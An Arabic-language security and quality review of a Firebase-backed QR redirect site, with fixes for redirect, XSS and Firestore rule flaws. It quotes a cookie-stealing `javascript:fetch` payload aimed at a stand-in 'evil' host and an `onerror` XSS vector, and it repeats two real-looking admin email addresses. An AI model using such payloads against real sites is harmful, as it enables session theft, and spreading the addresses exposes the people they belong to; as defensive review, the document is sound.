# مِحَك — مراجعة مستودع QR-Convert

**النوع المكتشف:** تطبيق (Application) — نظام تحويل روابط QR مبني على صفحات ثابتة + Firebase. لا توجد حلقة لعب ولا محرك رسم، فطُبّق رابرك التطبيقات.
**تاريخ المراجعة:** 2026-09-05 · **الفرع:** `claude/mihak-skill-y45c94`
**نطاق المراجعة:** المستودع كامل (9 ملفات، ~1375 سطر كود + ~36KB توثيق) — لا توجد أجزاء غير مقروءة.

## 1. نظرة عامة سريعة

المشروع نظام "روابط QR قابلة للتحديث": المستخدم يطبع QR يشير لرابط ثابت على GitHub Pages، والصفحة تقرأ الوجهة الحقيقية من Firestore وتحوّل الزائر إليها، فيقدر صاحب المشروع يغيّر الوجهة بعد الطباعة من لوحة تحكم بدون إعادة طباعة الـ QR. اللوحة تدعم إضافة/تعديل/تعطيل/حذف الروابط، وعدّاد نقرات، وأرشيف تعديلات.

**البنية:** ثلاث صفحات HTML مستقلة تمامًا في `docs/` (تُنشر عبر GitHub Pages)، كل صفحة تحمل الـ CSS والـ JS والإعدادات داخلها. لا توجد عملية بناء (build) ولا حزم npm ولا كود مشترك.

### 2.2 صحة الوظيفة الأساسية والحالات الحدّية — 2/10

هنا أخطر ما في المشروع. **ثلاث مشاكل، كل واحدة منها كافية لتعطيل الوظيفة الأساسية بالكامل** (التحويل من QR).

#### 🔴 (أ) الروابط الفرعية لا تعمل إطلاقًا — تصل لصفحة 404 لا لصفحة التحويل

التوثيق يَعِد بأن `https://abosalehg-ui.github.io/QR-Convert/main` يحوّل الزائر. لكن GitHub Pages موقع ثابت: ما فيه ملف اسمه `main`، فيرد بـ `404.html`. وملف `docs/404.html` **ما فيه أي منطق تحويل** — كل ما فيه:

```js
const path = window.location.pathname;
console.log('المسار المطلوب:', path);
// يمكن إضافة تتبع للروابط الخاطئة هنا
```

يعني كل رابط QR فرعي = صفحة خطأ للزائر. هذا يكسر الغرض الكامل من المشروع.

**الحل:** انقل منطق التحويل من `index.html` إلى `404.html` (هو المسار الذي تمر منه فعليًا كل الروابط الفرعية على GitHub Pages)، واجعل رسالة 404 هي حالة الفشل بعد عدم إيجاد المستند، لا الحالة الافتراضية.

#### 🔴 (ب) استخراج اسم الرابط يعطي `QR-Convert` بدل الاسم المطلوب

`docs/index.html` — في `redirect()`:

```js
const path = window.location.pathname;
const linkName = path.split('/').filter(p => p).pop() || 'main';
```

عند فتح جذر الموقع، `pathname` تساوي `/QR-Convert/`. بعد `filter` تبقى عنصر واحد `"QR-Convert"`، و`pop()` ترجعه. النتيجة: النظام يبحث عن مستند اسمه `QR-Convert` في Firestore، والقيمة الافتراضية `'main'` **لا تُستخدم أبدًا** لأن `pop()` ما ترجع قيمة فارغة هنا.

**الحل:** اطرح اسم المستودع من المسار صراحةً بدل الاعتماد على آخر جزء:

```js
const BASE = '/QR-Convert/';
const rest = window.location.pathname.replace(BASE, '').replace(/^\/+|\/+$/g, '');
const linkName = rest && rest !== 'index.html' ? rest : 'main';
```

#### 🔴 (ج) عدّاد النقرات يمنع التحويل لأن قواعد Firestore ترفض الكتابة للزائر

`docs/index.html` يكتب العدّاد **قبل** التحويل، وبـ `await`:

```js
await updateDoc(doc(db, 'links', linkName), {
    clicks: increment(1),
    lastClicked: new Date()
});
window.location.href = data.url;
```

بينما `firestore.rules` تسمح بالتعديل للمسؤول فقط:

```
allow create, update, delete: if isAdmin();
```

الزائر العادي غير مسجّل دخول، فترفض القاعدة الكتابة، و`await` ترمي استثناء، فيقفز التنفيذ إلى `catch` ويظهر "حدث خطأ في تحميل الرابط" — **والسطر الذي يحوّل الزائر لا يُنفَّذ أصلًا**. أي أنه حتى لو صُلحت المشكلتان (أ) و(ب)، التحويل يبقى معطلًا.

**الحل (اختر واحدًا):**
1. اسمح بزيادة العدّاد فقط، بقاعدة تتحقق أن التغيير محصور في حقلي العدّاد:
```
allow update: if isAdmin() ||
  (request.resource.data.diff(resource.data).affectedKeys()
     .hasOnly(['clicks','lastClicked'])
   && request.resource.data.clicks == resource.data.clicks + 1);
```
2. أو الأبسط والأأمن: حوّل الزائر أولًا ولا توقف التحويل على نجاح العدّاد:
```js
updateDoc(ref, { clicks: increment(1), lastClicked: serverTimestamp() }).catch(() => {});
window.location.replace(data.url);
```
(لاحظ أيضًا: `new Date()` تستخدم ساعة جهاز الزائر؛ الصحيح `serverTimestamp()`.)

#### 🟠 (د) انهيار عرض القائمة عند طابع زمني غير مكتمل

`docs/admin.html` — في `loadLinks()`:

```js
<span>⏰ تم الإنشاء: ${new Date(data.createdAt.toDate()).toLocaleDateString('ar-EG')}</span>
```

`createdAt` يُكتب بـ `serverTimestamp()`، وهي `null` محليًا حتى يؤكدها الخادم. أول عرض بعد الإضافة يرمي `Cannot read properties of null` فتسقط القائمة كلها. لاحظ التناقض داخل نفس الدالة: `lastClicked` محمي بشرط، و`createdAt` غير محمي.

**الحل:** `data.createdAt?.toDate ? ... : '—'`.

### 2.3 ملف النشر `deploy.yml` — 0/10 🔴

`.github/workflows/deploy.yml` **ليس ملف GitHub Actions إطلاقًا**. محتواه نسخة من قواعد Firestore:

```
rules_version = '2';
service cloud.firestore {
  ...
```

نتيجتان:
1. GitHub يحاول تحليله كـ YAML في كل دفعة ويفشل — سجل Actions أحمر دائمًا بلا سبب حقيقي.
2. **إيميلات المسؤولين الحقيقية منشورة في مستودع عام** — بما فيها عنوان حكومي (`qr@nrrc.gov.sa`) — بينما `firestore.rules` (الملف الصحيح) ما زال يحمل القيم الافتراضية `your-email@gmail.com`. أي أن النسخة المنشورة فعليًا في Firebase غير مرئية في المستودع، والنسخة المرئية غير صحيحة.

**الحل:** احذف `.github/workflows/deploy.yml`، وانقل قائمة الإيميلات الحقيقية إلى `firestore.rules`. إذا أردت نشرًا آليًا للقواعد فاكتب workflow حقيقيًا يشغّل `firebase deploy --only firestore:rules` بمفتاح في GitHub Secrets.

### 3.4 العربية و RTL — 6/10

الأساس صحيح: `<html lang="ar" dir="rtl">` في الملفات الثلاثة، والهوامش الاتجاهية معكوسة بوعي (`border-right` على `.link-item`، `margin-right` على `.copy-btn`) لا منسوخة من قالب LTR.

لكن:
- **لا يوجد خط عربي**: `font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif` — كلها خطوط لاتينية. العربية تُعرض بخط النظام الافتراضي، فيختلف شكل اللوحة بين ويندوز وأندرويد وiOS. أضف `'Noto Kufi Arabic'` أو `'IBM Plex Sans Arabic'` أو على الأقل `Tahoma` أولًا لأنها الأفضل عربيًا في هذه القائمة.
- **تضارب في شكل الأرقام**: `toLocaleString('ar-EG')` تُخرج أرقامًا هندية (٢٠٢٦/٩/٥) بينما عدّاد النقرات يُعرض بأرقام عربية (`123`) في نفس السطر. وحّدها — الأنسب `ar-SA-u-nu-latn` أو `ar-EG-u-nu-latn`.
- **التقويم**: `ar-EG` تعطي التقويم الميلادي، وقد يكون الهجري أنسب للسياق السعودي؛ قرار منتج لا خطأ.
- `.close-modal { float: left; }` صحيح في RTL لكنه هشّ؛ استخدم Flexbox في ترويسة النافذة.
- `.suggestions ul { text-align: right; }` — الأفضل `text-align: start` ليعمل تلقائيًا لو أضيفت لغة ثانية.

### 3.5 إمكانية الوصول (Accessibility) — 3/10

أضعف نقطة في تجربة الاستخدام:

- **لا يوجد `aria-label` واحد** في المشروع كله. الأزرار المعتمدة على الإيموجي (`🗑️ حذف`, `📋 نسخ`) مفهومة بصريًا فقط.
- **النوافذ المنبثقة بلا أي معالجة للوحة المفاتيح**: لا `role="dialog"`، لا `aria-modal`، لا حبس للتركيز (focus trap)، لا إغلاق بـ Esc، ولا إعادة التركيز لموضعه بعد الإغلاق. مستخدم لوحة المفاتيح يعلق خلف النافذة.
- **تنبيهات النجاح/الخطأ غير معلَنة** لقارئ الشاشة: `showSuccess/showError` تغيّر `textContent` وتظهر العنصر بلا `role="alert"` أو `aria-live="polite"` — المستخدم الكفيف لا يعرف أن العملية نجحت.
- **التباين**: `small { color: #777; }` على أبيض ≈ 4.5:1 على الحدّ تمامًا لنص 14px، و`.stat-label { opacity: 0.9 }` فوق تدرج يهبط تحت الحد في المنطقة الفاتحة من التدرج.
- `.spinner` في `index.html` بلا `role="status"` ولا نص بديل.
- الحقول تعتمد على `placeholder` مع `<label>` موجود — جيد، لكن بلا ربط `for`/`id`، فالنقر على النص لا ينقل التركيز.

**الحل الأسرع بأعلى عائد:** أضف `aria-label` لكل زر أيقوني، و`role="alert"` على عنصري التنبيه، و`role="dialog" aria-modal="true"` + إغلاق بـ Esc للنوافذ، واربط كل `<label>` بـ `for`.

### 4.1 المفاتيح والأسرار — 🟠 متوسط

- **`firebaseConfig` علنًا: ليس ثغرة.** مفاتيح Firebase الأمامية مصمّمة لتكون عامة، والحماية من القواعد. `SECURITY.md` أصاب في هذا، بينما README يقول العكس — صحّح README لا الكود.
- 🟠 **إيميلات حقيقية مكشوفة في مستودع عام**: `.github/workflows/deploy.yml` يحوي `abo.saleh.g@gmail.com` و`qr@nrrc.gov.sa`. كشف عناوين المسؤولين يمنح المهاجم نصف المعادلة (اسم الحساب) ويجعل التصيّد الموجّه أسهل، وعنوان النطاق الحكومي يرفع قيمة الهدف.
  **الحل:** احذف الملف من الشجرة، وبما أن التاريخ عام فاعتبر العنوانين مكشوفين ولا تتراجع عن ذلك: **فعّل التحقق بخطوتين (2FA) على الحسابين فورًا**. الأنظف مستقبلًا: استخدم Custom Claims (`request.auth.token.admin == true`) بدل قائمة إيميلات مكتوبة في ملف عام.
- ✅ لا توجد أسرار خادم ولا `.env` مرفوع.

### 4.2 الحقن و XSS — 🟠 متوسط

`docs/admin.html` — في `loadLinks()`، بيانات Firestore تُحقن مباشرة في `innerHTML`:

```js
linkItem.innerHTML = `
    <span class="link-name">${linkId}</span>
    <div class="link-desc">${data.description || 'لا يوجد وصف'}</div>
    <button onclick="editLink('${linkId}')" class="btn">✏️ تعديل</button>
`;
```

ومثلها في `viewHistory()` مع `data.changedBy` و`data.url`. والقيود على المدخلات موجودة في المتصفح فقط (`pattern="[a-zA-Z0-9_-]+"`)، ولا شيء منها في `firestore.rules` — والمتصفح ليس حدًا أمنيًا.

الخطورة الحالية محدودة لأن الكتابة محصورة بالمسؤولين، لكنها تتحول إلى **XSS مخزّن حقيقي** في لحظة إضافة مسؤول ثانٍ (والقواعد أصلًا مصممة لأكثر من واحد). وصف يحوي `<img src=x onerror=...>` ينفّذ في متصفح المسؤول الآخر بصلاحياته الكاملة.

نفس النمط في `index.html` — في `showError()`، تُبنى `document.body.innerHTML` من نص الرسالة.

**الحل:** ابنِ العناصر بـ `document.createElement` و`textContent`، واستبدل `onclick` المضمّن بـ `dataset` + مستمع واحد:
```js
const el = document.createElement('div');
el.textContent = data.description || 'لا يوجد وصف';
btn.dataset.linkId = linkId;
```
وأضف تحقق نوع وطول في القواعد:
```
allow create: if isAdmin()
  && request.resource.data.description is string
  && request.resource.data.description.size() < 500;
```

### 4.3 إعادة التوجيه المفتوح ونطاق الوجهة — 🟠 متوسط

`docs/index.html`: `window.location.href = data.url;` — بلا أي تحقق من المخطط (scheme). قيمة مثل `javascript:fetch('https://evil/'+document.cookie)` تُنفَّذ كسكربت في نطاق الموقع. حقل الإدخال `type="url"` يمنعها في المتصفح، لكن القواعد لا تمنع كتابتها عبر واجهة Firestore مباشرة.

**الحل:** تحقق في الطرفين. في الكود:
```js
const u = new URL(data.url, location.origin);
if (!['http:', 'https:'].includes(u.protocol)) throw new Error('bad scheme');
location.replace(u.href);
```
وفي القواعد: `request.resource.data.url.matches('^https?://.*')`.

### 4.4 الصلاحيات والمصادقة — 🟠 متوسط

القاعدة الأساسية سليمة ومكتوبة بوعي: `allow read, write: if false` على كل ما عداها، والأرشيف محمي من التعديل والحذف بـ `if false` — تصميم صحيح لسجل غير قابل للتلاعب.

لكن:
- 🟠 **`allow read: if true` على `links` تكشف أكثر مما يلزم للتحويل.** أي شخص يقدر — بمفتاح API العلني — يسحب المجموعة كاملة عبر واجهة Firestore ويحصل على: كل الوجهات، عدّادات النقرات، وحقل `createdBy` الذي **يحوي إيميل المسؤول**. هذا يعني أن حذف `deploy.yml` وحده لا يخفي الإيميلات.
  **الحل:** انقل بيانات التحويل العامة (`url`, `active`) إلى مستند عام مصغّر، واحتفظ بـ `createdBy` والإحصائيات في حقول/مجموعة محمية. أو الأفضل: نفّذ التحويل عبر Cloud Function تقرأ بصلاحية الخادم ولا تكشف المجموعة.
- 🟠 **لوحة التحكم تُعرض لأي مستخدم Google مسجّل**، لأن `onAuthStateChanged` تتحقق من وجود مستخدم فقط لا من كونه مسؤولًا:
```js
if (user) { /* أظهر اللوحة */ }
```
الكتابة سترفضها القواعد (الحماية الفعلية قائمة)، لكن الضيف يرى اللوحة كاملة ورسائل الأخطاء، وهو تشويش وكشف بنية بلا داعٍ.
  **الحل:** تحقق من الصلاحية بعد الدخول (Custom Claim أو محاولة قراءة مستند مسؤولين) وأظهر "لا تملك صلاحية" بدل اللوحة.
- 🟡 لا توجد سياسة انتهاء جلسة؛ جلسة Firebase تتجدد تلقائيًا إلى ما لا نهاية. مقبول لأداة إدارية شخصية، يستحق إعادة نظر إذا زاد عدد المسؤولين.

### 4.6 الاعتماديات — 🟡 بسيط

**الحل:** راجع إصدار Firebase دوريًا (كل ربع سنة)، ووثّق سبب التثبيت في تعليق فوق الاستيراد.

### 4.7 الترويسات و CSP — 🟡 بسيط

GitHub Pages لا يسمح بترويسات مخصصة، فـ HSTS/X-Frame-Options خارج نطاق التحكم (HSTS مفعّلة أصلًا على `github.io`). لكن يمكن إضافة CSP عبر وسم meta، وهي تقلّل أثر أي XSS مستقبلي بشكل كبير:

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self' https://www.gstatic.com;
               connect-src https://*.googleapis.com https://*.firebaseio.com;
               frame-ancestors 'none'">
```
(الانتقال إلى CSP يستلزم إخراج الـ CSS/JS المضمّن إلى ملفات، وهو نفس ما توصي به الملاحظة 2.1 — إصلاح واحد يخدم هدفين.)

### أعطال إضافية كشفتها الاختبارات أثناء التنفيذ

ثلاثة أعطال لم تكن في التقرير الأصلي لأنها لا تظهر بقراءة الكود وحدها:

1. **ضياع كل النقرات.** إطلاق كتابة العدّاد بلا انتظار ثم التحويل فورًا يهدم
   الصفحة قبل أن تغادر الكتابة المتصفح. الحل سباق بمهلة 800ms: النقرة
   تُسجَّل، والزائر لا ينتظر أكثر من ذلك مهما حدث.
2. **فحص صلاحية اللوحة يفشل للمسؤول نفسه.** المعرّف المستخدم في الفحص كان
   `__access_probe__`، وFirestore يحجز أي معرّف يبدأ وينتهي بشرطتين سفليتين،
   فيرجع `invalid-argument` بدل `permission-denied` ويُحرم المالك من الدخول.
3. **سمة `pattern` غير صالحة.** `[a-zA-Z0-9_-]+` ترفضها المتصفحات الحديثة
   (وضع `v`) فيسقط تحقق المتصفح صامتًا. صُحّحت إلى `[a-zA-Z0-9_\-]+`.
4. **مخالفة CSP في كل زيارة.** نقل Firestore يحمّل صورة فحص اتصال من
   `www.google.com`، وكانت `img-src` تمنعها.
